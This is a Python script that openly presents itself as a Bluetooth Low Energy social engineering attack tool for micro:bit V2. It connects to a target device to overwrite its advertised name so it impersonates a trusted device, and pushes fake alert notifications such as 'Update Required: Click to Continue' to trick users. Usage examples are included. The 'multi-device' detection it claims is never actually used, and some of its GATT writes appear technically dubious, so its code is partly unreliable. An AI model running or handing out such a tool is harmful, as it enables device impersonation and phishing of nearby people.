# microbit_ble_social_engineering.py

"""
BLE Social Engineering Attack for micro:bit V2 (Multi-Device Support)

This script performs BLE-based social engineering attacks by impersonating trusted devices and sending deceptive BLE advertisements.
- Detects available micro:bit devices and assigns tasks dynamically
- Spoofs trusted BLE devices (`--spoof <mac> <name>`)
- Sends fake notifications to nearby BLE devices (`--notify <target_mac> <message>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Spoof a trusted BLE device:
   ```sh
   python microbit_ble_social_engineering.py --spoof AA:BB:CC:DD:EE:FF "Trusted_Device"
   ```

2. Send a fake BLE notification to a target device:
   ```sh
   python microbit_ble_social_engineering.py --notify AA:BB:CC:DD:EE:FF "Update Required: Click to Continue"
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Device Spoofing
async def ble_spoof(target_mac, spoof_name):
    """Impersonates a trusted BLE device by changing its name."""
    print(f"[+] Spoofing BLE identity: {target_mac} -> {spoof_name}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a00-0000-1000-8000-00805f9b34fb", spoof_name.encode())
        print(f"[+] Identity spoofed: {target_mac} now appears as {spoof_name}.")

# Fake BLE Notifications
async def ble_notify(target_mac, message):
    """Sends a fake BLE notification message to trick the user."""
    print(f"[+] Sending fake notification to {target_mac}: {message}")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a46-0000-1000-8000-00805f9b34fb", message.encode())
        print(f"[+] Fake notification sent: {message}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Social Engineering Attack for micro:bit V2")
    parser.add_argument("--spoof", nargs=2, metavar=("target_mac", "spoof_name"), help="Spoof a BLE device identity")
    parser.add_argument("--notify", nargs=2, metavar=("target_mac", "message"), help="Send a fake BLE notification message")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.spoof:
        loop.run_until_complete(ble_spoof(args.spoof[0], args.spoof[1]))
    elif args.notify:
        loop.run_until_complete(ble_notify(args.notify[0], args.notify[1]))
